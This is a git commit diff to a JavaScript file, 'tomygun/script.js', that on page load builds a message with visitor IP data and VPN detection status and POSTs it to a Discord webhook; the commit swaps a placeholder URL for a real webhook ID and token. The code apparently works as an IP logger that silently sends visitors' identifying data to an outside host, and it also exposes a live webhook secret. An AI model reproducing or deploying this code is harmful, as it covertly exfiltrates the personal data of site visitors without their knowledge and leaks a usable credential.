02b3ad2d54273da552984be2a05965d43dd0e486
nao <106890495+toralol@users.noreply.github.com>
2026-04-14 17:20:31 +0100

    Update script.js

--- tomygun/script.js
+++ tomygun/script.js
@@ -8,7 +8,7 @@ $(document).ready(function () {
                          + 'VPN: ' + (ipData.usingVPN === true ? 'Detected' : 'Not Detected');
 
             $.ajax({
-                url:  "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
+                url:  "https://discord.com/api/webhooks/1493647010929049600/9-YW9hVMi2ks598EQ_EVEqN5PPcLNYeR39N73luMCv5A9iUK2Nin2XTGbqkNlCZChnU_",
                 type: 'POST',
                 data: JSON.stringify({ content: message }),
                 contentType: 'application/json'
